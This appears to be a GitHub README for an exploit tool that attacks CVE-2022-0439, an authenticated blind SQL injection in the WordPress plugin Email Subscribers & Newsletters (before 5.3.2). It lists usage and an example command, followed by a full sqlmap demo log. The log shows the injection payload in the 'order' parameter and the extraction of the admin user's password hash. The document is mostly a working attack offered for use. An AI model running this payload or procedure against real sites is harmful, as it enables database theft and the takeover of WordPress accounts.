# CVE-2022-0439
CVE-2022-0439 - Email Subscribers &amp; Newsletters &lt; 5.3.2 - Subscriber+ Blind SQL injection

Must Have
----

sqlmap installed & a valid username & password with subscriber+

Usage
---

```
usage: CVE-2022-0439.py [-h] -w URL -u USERNAME -p PASSWORD

options:
  -h, --help            show this help message and exit
  -w URL, --url URL     URL of the WordPress site
  -u USERNAME, --username USERNAME
                        Username of your wordpress user
  -p PASSWORD, --password PASSWORD
                        Password of your wordpress password
```

Example
----

```
python3 CVE-2022-0439.py -w http://127.0.0.1:8999 -u user -p useruser1
```

Demo
---

```
The plugin version is below 5.3.2.
Select a user:
1. admin
Enter the user ID: 1
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.5#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:24:12 /2023-06-08/

[22:24:13] [WARNING] provided value for parameter 'order' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[22:24:13] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: order (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: action=ajax_fetch_report_list&order= AND 7222=(SELECT (CASE WHEN (7222=7222) THEN 7222 ELSE (SELECT 4051 UNION SELECT 8971) END))-- -
---
[22:24:13] [INFO] testing MySQL
[22:24:13] [INFO] confirming MySQL
[22:24:13] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: PHP 8.0.28, Apache 2.4.56
back-end DBMS: MySQL >= 8.0.0
[22:24:13] [INFO] fetching SQL SELECT statement query output: 'SELECT user_pass FROM wp_users WHERE ID = 1'

[22:24:13] [INFO] retrieved: 1
[22:24:13] [INFO] retrieving the length of query output

[22:24:13] [INFO] retrieved: 34
[22:24:14] [INFO] retrieved: __________________________________
[22:24:14] [INFO] retrieved:
[22:24:17] [INFO] retrieved: $P$Bo9VMmaPu7iCbg9xXgIrEJmtfFNbDa1
[22:24:18] [INFO] retrieved: $P$Bo9VMmaPu7iCbg9xXgIrEJmtfFNbDa1
SELECT user_pass FROM wp_users WHERE ID = 1: '$P$Bo9VMmaPu7iCbg9xXgIrEJmtfFNbDa1'
[22:24:18] [INFO] fetched data logged to text files under '/Users/rwiggins/.local/share/sqlmap/output/127.0.0.1'

[*] ending @ 22:24:18 /2023-06-08/
```
